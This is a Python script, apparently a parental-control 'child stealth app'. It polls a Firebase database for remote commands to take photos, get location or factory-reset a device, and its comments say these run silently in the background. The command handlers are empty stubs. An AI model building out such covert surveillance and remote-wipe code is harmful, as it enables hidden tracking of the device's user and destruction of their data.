import time
import random
import firebase_admin
from firebase_admin import credentials, db

def init_firebase():
    if not firebase_admin._apps:
        try:
            cred = credentials.Certificate('serviceAccountKey.json')
            firebase_admin.initialize_app(cred, {
                'databaseURL': 'https://parentalcontrol-3a591-default-rtdb.firebaseio.com/'
            })
        except:
            pass

def run_child_stealth_app():
    init_firebase()
    child_id = "child_device_01"
    ref = db.reference(f'children/{child_id}')
    control_ref = db.reference(f'commands/{child_id}')
    
    # تحديث الحالة بصمت في الخلفية بمجرد الاتصال
    try:
        ref.update({
            'name': 'هاتف الطفل (أيمن)',
            'status': 'متصل 🟢',
            'last_seen': time.strftime("%Y-%m-%d %H:%M:%S")
        })
    except:
        pass
    
    # حلقة العمل الصامت في الخلفية
    while True:
        try:
            # استقبال الأوامر وتثبيت الحالة بصمت تام
            command_data = control_ref.get() or {}
            action = command_data.get('action')
            
            if action and not command_data.get('executed', False):
                # هنا يتم تنفيذ الأوامر (كاميرا، موقع، فورمات) بصمت بالخلفية
                if action == 'take_photo':
                    pass
                elif action == 'get_location':
                    pass
                elif action == 'factory_reset':
                    pass
                
                control_ref.update({'executed': True})
            
            ref.update({'last_seen': time.strftime("%Y-%m-%d %H:%M:%S")})
        except:
            pass
            
        time.sleep(10)

if __name__ == '__main__':
    run_child_stealth_app()
